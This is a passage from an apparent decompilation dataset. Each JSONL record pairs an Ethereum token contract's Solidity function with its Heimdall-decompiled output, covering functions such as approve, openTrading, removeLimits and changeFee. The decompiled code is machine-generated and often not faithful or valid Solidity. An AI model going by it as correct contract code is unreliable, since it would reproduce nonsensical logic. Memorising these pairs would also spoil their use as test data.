0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\r\n        require(\r\n            newNum >= ((totalSupply() * 5) / 1000) / 1e18,\r\n            \"Cannot set maxWallet lower than 0.5%\"\r\n        );\r\n        maxWallet = newNum * (10**18);\r\n    }", "heimdall_decompiled_code": "function updateMaxWalletAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(0x05) & (totalSupply > 0x3333333333333333333333333333333333333333333333333333333333333333));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0xFF5C43C4fADdF9A03BEdE1D0b276E7eC996504a1", "original_solidity_code": "function changeFee (uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {\r\n        _redisFeeOnBuy = redisFeeOnBuy;\r\n        _redisFeeOnSell = redisFeeOnSell;\r\n        _taxFeeOnBuy = taxFeeOnBuy;\r\n        _taxFeeOnSell = taxFeeOnSell;\r\n    }", "heimdall_decompiled_code": "function changeFee(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_i = arg0;\n        store_j = arg1;\n        store_k = arg2;\n        store_l = arg3;\n    }"}
{"contract_address": "0x1727A45a3E3bE7AdF4B185D80F0b4F557b755f87", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x05f5e100 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_f / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x05f5e100;\n        var_a = 0x05f5e100;\n        emit Approval(address(this), address(store_f / 0x01), 0x05f5e100);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xd0ccce1D39ceE3F1eA77D14C495eAbA9DF6BCA69", "original_solidity_code": "function isBot(address a) public view returns (bool) {\\n      return bots[a];\\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0xfC5b4524F85D2f45997f2705B448d346c0a5eAc1", "original_solidity_code": "function openTrading() external onlyOwner {\r\n        require(!tradingOpen, \"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(\r\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n        );\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(\r\n                address(this),\r\n                uniswapV2Router.WETH()\r\n            );\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n        IERC20(uniswapV2Pair).approve(\r\n            address(uniswapV2Router),\r\n            type(uint256).max\r\n        );\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_c / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_k = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_k));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x989680, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_l[var_e] = 0x989680;\n        var_a = 0x989680;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x989680);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_k / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_k / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x1e144B971aB5f6Dac1aDE8CF21207EB30041543E", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_m[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function enableTrading(uint256 _deadBlocks) external onlyOwner {\r\n        require(!tradingActive, \"Token launched\");\r\n        tradingActive = true;\r\n        launchBlock = block.number;\r\n        swapEnabled = true;\r\n        deadBlocks = _deadBlocks;\r\n    }", "heimdall_decompiled_code": "function enableTrading(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(tradingActive / 0x0100)), \"Token launched\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0e;\n        var_d = 0x546f6b656e206c61756e63686564000000000000000000000000000000000000;\n        store_l = block.number;\n        tradingActive = 0x010100 | (uint240(tradingActive));\n        store_m = arg0;\n    }"}
{"contract_address": "0xeBca4047fEA5D4bB97BCDeb3fC6000fEf830aF2B", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x0f4240) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x0f4240;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x0f4240) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x0f4240;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x0f4240) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x0f4240;\n                                emit MaxTxAmountUpdated(0x0f4240);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x384D84b0E082987D9f103c1ee2cD101C044a076a", "original_solidity_code": "function transfer(address _to, uint256 _value) returns (bool success) {}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public returns (bool) {\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        if (storage_map_c[var_a] < arg1) {\n            if (storage_map_c[var_a] < arg1) {\n                uint256 var_c = 0;\n                return 0;\n                var_a = address(msg.sender);\n                var_b = 0;\n                storage_map_c[var_a] = storage_map_c[var_a] - arg1;\n                var_a = address(arg0);\n                var_b = 0;\n                storage_map_c[var_a] = storage_map_c[var_a] + arg1;\n                var_c = arg1;\n                emit Transfer(address(msg.sender), address(arg0), arg1);\n                var_c = 0x01;\n                return 0x01;\n                if (!arg1 > 0) {\n                    var_a = address(msg.sender);\n                    var_b = 0;\n                    storage_map_c[var_a] = storage_map_c[var_a] - arg1;\n                    var_a = address(arg0);\n                    var_b = 0;\n                    storage_map_c[var_a] = storage_map_c[var_a] + arg1;\n                    var_c = arg1;\n                    emit Transfer(address(msg.sender), address(arg0), arg1);\n                    var_c = 0x01;\n                    return 0x01;\n                    var_c = 0;\n                    return 0;\n                }\n            }\n        }\n    }"}
{"contract_address": "0xf959A1B28a1e6D16a58D56D007fA74Fa4C5A8AeB", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xbe862864614FB652e663EA82FC3AdEAD65E73d29", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x0aCf2a152c8551ba658D8D16a7Fdc1b3230d7b37", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function removeLimits() external onlyOwner returns (bool) {\r\n        limitsInEffect = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function removeLimits() public returns (bool) {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingActive = (0 * 0x01) | (uint248(tradingActive));\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xa515dE84372C195F39fa6993AE9f7955EFFd8d1c", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x52FE190D632c22aD6E4a0aA0916a4B45aC073be6", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_e[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x110B3EbD95Ac61b8Db462b9d85F73de7Ea5BcF1e", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function removeLimits() external onlyOwner returns (bool){\r\n        limitsInEffect = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function removeLimits() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingActive = uint248(tradingActive);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xbFD03022a32dB1502489AE1F65bd8f343CC09AB9", "original_solidity_code": "function updateDevSplinterOasisNode(address newLotteryWallet) external onlyOwner {\\r\\n        emit lotteryWalletUpdated(newLotteryWallet, DevSplinterOasisNode);\\r\\n        DevSplinterOasisNode= newLotteryWallet;\\r\\n    }", "heimdall_decompiled_code": "function updateDevSplinterOasisNode(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit lotteryWalletUpdated(address(arg0), address(DevSplinterOasisNode / 0x01));\n        DevSplinterOasisNode = (address(arg0) * 0x01) | (uint96(DevSplinterOasisNode));\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function approve(address to, uint256 tokenId) external payable;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!address(0xaaeb6d7670e522a718067333cd4e).code.length, CustomError_df2d9b42());\n        require(0x01 > arg1, CustomError_df2d9b42());\n        uint256 var_a = arg1;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(0 - storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        require(!0x01, CustomError_cfb3b942());\n        require(!0x01, CustomError_cfb3b942());\n        var_a = arg1;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c46;\n        storage_map_b[var_a] = (address(arg0)) | (uint96(storage_map_b[var_a]));\n        emit Approval(address(storage_map_b[var_a]), address(arg0), arg1);\n        var_a = address(storage_map_b[var_a]);\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c47;\n        var_a = address(msg.sender);\n        uint256 var_b = keccak256(var_a);\n        require(bytes1(storage_map_b[var_a]), CustomError_cfb3b942());\n        var_a = arg1;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c46;\n        storage_map_b[var_a] = (address(arg0)) | (uint96(storage_map_b[var_a]));\n        emit Approval(address(storage_map_b[var_a]), address(arg0), arg1);\n        var_a = 0xcfb3b94200000000000000000000000000000000000000000000000000000000;\n        require(!(!(address(storage_map_b[var_a])) == msg.sender), CustomError_df2d9b42());\n        var_a = arg1;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c46;\n        storage_map_b[var_a] = (address(arg0)) | (uint96(storage_map_b[var_a]));\n        emit Approval(address(storage_map_b[var_a]), address(arg0), arg1);\n        require(arg1 < totalSupply, CustomError_df2d9b42());\n        var_a = arg1 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = (arg1 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = ((arg1 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = (((arg1 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0xc617113400000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        address var_e = address(arg0);\n        (bool success, bytes memory ret0) = address(0xaaeb6d7670e522a718067333cd4e).Unresolved_c6171134(var_d); // staticcall\n        uint256 var_f = var_f + (uint248(ret0.length + 0x1f));\n        require(!(((var_f + ret0.length) - var_f) < 0x20), CustomError_ede71dcc());\n        require(var_f.length == var_f.length, CustomError_ede71dcc());\n        require(var_f.length, CustomError_ede71dcc());\n        var_g = 0xede71dcc00000000000000000000000000000000000000000000000000000000;\n        var_e = address(arg0);\n    }"}
{"contract_address": "0xC246C2C0B1DEBBFF9370a5A2f0BD35c17DE5b373", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
